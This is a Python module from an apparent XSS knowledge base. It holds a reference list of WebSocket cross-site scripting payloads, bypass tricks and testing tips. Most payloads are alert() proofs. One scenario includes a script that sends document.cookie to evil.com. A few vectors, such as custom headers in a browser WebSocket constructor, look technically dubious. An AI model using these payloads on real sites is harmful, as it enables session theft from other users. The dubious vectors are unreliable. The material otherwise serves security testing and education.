#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-04 19:21:27 UTC
Status: Created
Telegram: https://t.me/easyprotech

Cross-Site Scripting (XSS) in WebSocket Context Context - Attack Vectors Module
"""

ATTACK_VECTOR = """
WEBSOCKET XSS ATTACK VECTORS:

1. MESSAGE ECHO INJECTION:
   Server-side code:
   ws.send(userMessage);  // Direct echo without sanitization

   Attack payload:
   <script>alert('XSS')</script>

   Result: All connected clients execute the script

2. USERNAME/DISPLAY NAME INJECTION:
   WebSocket protocol:
   {"type": "user_joined", "username": "USER_INPUT", "message": "joined"}

   Attack payloads:
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>

3. REAL-TIME CHAT MESSAGES:
   Client sends:
   {"type": "chat", "message": "<script>alert(1)</script>"}

   Server broadcasts to all:
   {"type": "message", "from": "user", "content": "<script>alert(1)</script>"}

4. STATUS UPDATE INJECTION:
   {"type": "status", "user": "admin", "status": "<script>alert(1)</script>"}

   Displayed as: admin's status: <script>alert(1)</script>

5. FILE SHARING METADATA:
   {"type": "file_shared", "filename": "<script>alert(1)</script>", "size": 1024}

6. GAME STATE MANIPULATION:
   {"type": "game_move", "player": "USER", "move": "<script>alert(1)</script>"}

ADVANCED WEBSOCKET XSS TECHNIQUES:

7. BINARY MESSAGE INJECTION:
   WebSocket binary messages with embedded HTML:
   ws.send(new Blob(['<script>alert(1)</script>'], {type: 'text/html'}));

8. FRAGMENTED PAYLOAD ATTACK:
   Split XSS across multiple messages:
   Message 1: {"type": "chat", "msg": "<scr"}
   Message 2: {"type": "chat", "msg": "ipt>alert(1)</script>"}

9. CONTROL FRAME MANIPULATION:
   WebSocket control frames with injected data:
   - Ping/Pong frames with malicious content
   - Close frames with script injection

10. SUBPROTOCOL NEGOTIATION ATTACK:
    Subprotocol strings with XSS:
    ws = new WebSocket('ws://target.com', ['chat', '<script>alert(1)</script>']);

11. EXTENSION NEGOTIATION XSS:
    WebSocket extensions with malicious parameters:
    ws = new WebSocket('ws://target.com', ['chat'], {
        headers: {'Sec-WebSocket-Extensions': 'permessage-deflate; <script>alert(1)</script>'}
    });

12. ORIGIN HEADER MANIPULATION:
    Spoofed Origin headers leading to XSS:
    Origin: <script>alert(1)</script>

WEBSOCKET-SPECIFIC BYPASSES:

13. MESSAGE TYPE CONFUSION:
    Sending JSON but receiving HTML interpretation:
    {"type": "message", "content": "<script>alert(1)</script>"}
    Becomes: Message: <script>alert(1)</script>

14. ESCAPE SEQUENCE BYPASS:
    \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
    Becomes: <script>alert(1)</script>

15. ENCODING BYPASSES:
    %3Cscript%3Ealert(1)%3C/script%3E
    Becomes: <script>alert(1)</script>

16. NULL BYTE INJECTION:
    <script>alert(1)</script>%00
    May bypass some filters

17. NEWLINE INJECTION:
    \\n<script>alert(1)</script>
    Can break parsing context

18. COMMENT-BASED INJECTION:
    <!-- <script>alert(1)</script> -->
    Hidden in HTML comments

REAL-WORLD ATTACK SCENARIOS:

19. CHAT APPLICATION ATTACK:
    - Attacker joins chat room
    - Sends <script>fetch('http://evil.com/steal', {method: 'POST', body: document.cookie})</script>
    - All users in room execute script
    - Cookies stolen from all participants

20. COLLABORATIVE EDITOR ATTACK:
    - Google Docs-style application
    - User types <script>alert('XSS')</script> as document title
    - All collaborators see alert
    - Potential for stealing auth tokens

21. GAMING PLATFORM ATTACK:
    - Multiplayer game with chat
    - Player name: <script>alert(1)</script>
    - Displayed as: Player <script>alert(1)</script> scored!
    - Affects all players in game

22. STOCK TRADING DASHBOARD:
    - Real-time stock updates
    - Symbol: <script>alert(1)</script>
    - Displayed to all traders
    - Market manipulation potential

23. IOT DEVICE CONTROL:
    - WebSocket to IoT devices
    - Device name: <script>alert(1)</script>
    - All users see script execution
    - Device hijacking potential

24. SOCIAL MEDIA LIVE FEED:
    - Real-time feed updates
    - Comment: <script>alert(1)</script>
    - All viewers affected simultaneously

WEBSOCKET XSS DETECTION:

25. MANUAL TESTING:
    - Intercept WebSocket traffic in browser dev tools
    - Send test payloads: <script>alert('XSS')</script>
    - Monitor for script execution

26. AUTOMATED SCANNING:
    - Use WebSocket clients to send payloads
    - Monitor responses for reflected content
    - Check for script execution in DOM

27. PROXY INTERCEPTION:
    - Burp Suite WebSocket interception
    - Modify messages in transit
    - Test for XSS vulnerabilities
"""
